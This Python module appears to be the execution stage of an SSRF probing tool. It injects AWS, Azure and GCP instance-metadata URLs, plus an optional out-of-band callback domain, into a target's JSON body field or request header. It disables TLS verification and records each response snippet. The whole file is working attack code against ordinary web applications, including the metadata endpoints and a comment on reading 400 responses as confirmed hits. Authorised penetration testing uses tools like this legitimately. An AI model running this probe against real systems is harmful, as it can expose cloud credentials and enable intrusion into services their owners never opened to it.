"""
Raw execution for ssrf_probe: injects candidate internal URLs (cloud
instance-metadata endpoints, plus an optional interactsh OOB domain) into a
JSON body field or a request header, and records each response. No parsing
here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"

PLACEHOLDER = "__SSRF__"
VALID_LOCATIONS = ("json_body", "header")
VALID_METHODS = ("GET", "POST")

METADATA_PRESETS = {
    "aws_imds_v1": "http://169.254.169.254/latest/meta-data/",
    "aws_imds_token": "http://169.254.169.254/latest/api/token",
    "azure_imds": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "gcp_imds": "http://metadata.google.internal/computeMetadata/v1/",
}
# Azure/GCP IMDS normally require a header (Metadata: true /
# Metadata-Flavor: Google respectively) this probe cannot attach to the
# backend's own outbound request -- a 400 from either preset (rather
# than a connection error) is still a meaningful signal the backend
# reached the real metadata service, and must be reported as such, not
# discarded as a failure.


@dataclass
class SsrfAttempt:
    preset_label: str
    internal_url: str
    status: Optional[int] = None
    body_snippet: str = ""   # first 500 chars only
    error: Optional[str] = None


@dataclass
class RawSsrfResult:
    target: str = ""
    inject_location: str = ""
    attempts: List[SsrfAttempt] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    """Ensure target has a valid HTTP/HTTPS scheme."""
    t = target.strip()
    if not t:
        return ""
    if not (t.startswith("http://") or t.startswith("https://")):
        t = f"https://{t}"
    return t


def _send(method: str, url: str, headers: dict, data: Optional[str], timeout: int):
    if method == "GET":
        return requests.get(url, headers=headers, data=data, timeout=timeout, verify=False)
    return requests.post(url, data=data, headers=headers, timeout=timeout, verify=False)


def execute(
    target: str,
    inject_location: str,
    method: str = "",
    json_body_template: str = "",
    header_name: str = "",
    oob_domain: str = "",
    timeout: int = 10,
) -> RawSsrfResult:
    if requests is None:
        return RawSsrfResult(target=target, inject_location=inject_location,
                             error="requests library not available")

    url = normalize_target_url(target)
    if not url:
        return RawSsrfResult(target=target, inject_location=inject_location, error="empty target URL")

    if inject_location not in VALID_LOCATIONS:
        return RawSsrfResult(target=url, inject_location=inject_location,
                             error="inject_location must be 'json_body' or 'header'")

    if inject_location == "json_body":
        if not json_body_template:
            return RawSsrfResult(target=url, inject_location=inject_location,
                                 error="json_body_template is required when inject_location is 'json_body'")
        try:
            json.loads(json_body_template)
        except ValueError:
            return RawSsrfResult(target=url, inject_location=inject_location,
                                 error="json_body_template is not valid JSON")
        if PLACEHOLDER not in json_body_template:
            return RawSsrfResult(target=url, inject_location=inject_location,
                                 error="json_body_template missing the __SSRF__ placeholder")
        http_method = (method or "POST").upper()
    else:
        if not header_name:
            return RawSsrfResult(target=url, inject_location=inject_location,
                                 error="header_name is required when inject_location is 'header'")
        http_method = (method or "GET").upper()

    if http_method not in VALID_METHODS:
        return RawSsrfResult(target=url, inject_location=inject_location,
                             error="method must be 'GET' or 'POST'")

    candidates = [(label, internal) for label, internal in METADATA_PRESETS.items()]
    if oob_domain:
        candidates.append(("oob_blind", f"http://{oob_domain.strip()}/ssrf"))

    result = RawSsrfResult(target=url, inject_location=inject_location)
    for label, internal_url in candidates:
        attempt = SsrfAttempt(preset_label=label, internal_url=internal_url)
        try:
            if inject_location == "json_body":
                body = json_body_template.replace(PLACEHOLDER, internal_url)
                headers = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
                resp = _send(http_method, url, headers, body, timeout)
            else:
                headers = {header_name: internal_url, "User-Agent": USER_AGENT}
                resp = _send(http_method, url, headers, "" if http_method == "POST" else None, timeout)
            attempt.status = resp.status_code
            attempt.body_snippet = resp.text[:500]
        except requests.RequestException as exc:
            attempt.error = str(exc)
        result.attempts.append(attempt)

    return result
